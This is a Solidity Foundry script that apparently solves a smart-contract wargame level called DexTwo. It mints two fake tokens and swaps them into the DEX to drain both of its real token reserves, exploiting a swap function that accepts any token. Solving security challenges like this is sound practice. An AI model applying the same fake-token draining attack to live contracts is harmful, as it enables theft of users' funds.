// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {DexTwo, FakeTok} from "../src/Lv-23/Dex2.sol";

contract Dex2Script is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN DEX2 INSTANCE ADDRESS
       DexTwo _dex = DexTwo(0xdA57AFC76f51DF587BdBc6f76510189a9f0AFf4b);
       FakeTok faker1 = new FakeTok(0xdA57AFC76f51DF587BdBc6f76510189a9f0AFf4b, "Faker", "Fkr", 100);
        FakeTok faker2 = new FakeTok(0xdA57AFC76f51DF587BdBc6f76510189a9f0AFf4b, "Faker", "Fkr", 100);
        _dex.approve(address(_dex), type(uint256).max);
       faker1.approve(msg.sender, address(_dex), 10);
       faker2.approve(msg.sender, address(_dex), 10);
       _dex.swap(address(faker1), address(_dex.token1()), 10);
        _dex.swap(address(faker2), address(_dex.token2()), 10);

        vm.stopBroadcast();
    }
}
